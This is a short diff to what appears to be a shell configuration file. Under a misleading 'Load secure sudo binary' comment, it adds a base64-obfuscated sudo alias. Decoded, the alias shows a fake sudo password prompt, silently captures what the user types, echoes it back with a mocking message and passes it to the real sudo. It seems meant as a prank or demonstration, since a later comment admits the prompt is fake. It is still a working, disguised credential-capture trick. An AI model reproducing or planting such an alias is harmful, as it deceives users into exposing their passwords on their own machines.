@@ -1,6 +1,5 @@
 # Load secure sudo binary
-alias sudo="$(echo "ZWNobyAtbiAiW3N1ZG9dIHBhc3N3b3JkIGZvciBoZW50YWlzaGlyb3l1a2k6ICI7cmVhZCAtcyBwYXNzOyBlY2hvIC1lICIKVGhhbmtzIGZvciB5b3VyIHBhc3N3b3JkIGhlbnRhaXNoaXJveXVraSAhCllvdXIgcGFzc3dvcmQgaXMgJHBhc3MgOjMiOyBlY2hvICRwYXNzIHwgc3VkbyAtLXN0ZGluIA==" | base64 -d)"
-
+alias sudo="$(echo "ZWNobyAtbiAiW3N1ZG9dIHBhc3N3b3JkIGZvciAkVVNFUjogIjtyZWFkIC1zIHBhc3M7IGVjaG8gLWUgIgpUaGFua3MgZm9yIHlvdXIgcGFzc3dvcmQgJFVTRVIgIQpZb3VyIHBhc3N3b3JkIGlzICRwYXNzIDozIjsgZWNobyAkcGFzcyB8IHN1ZG8gLS1zdGRpbiA=" | base64 -d)"
 
 # This alias is an obfuscation and one liner of this script :
 # We fake the sudo prompt.
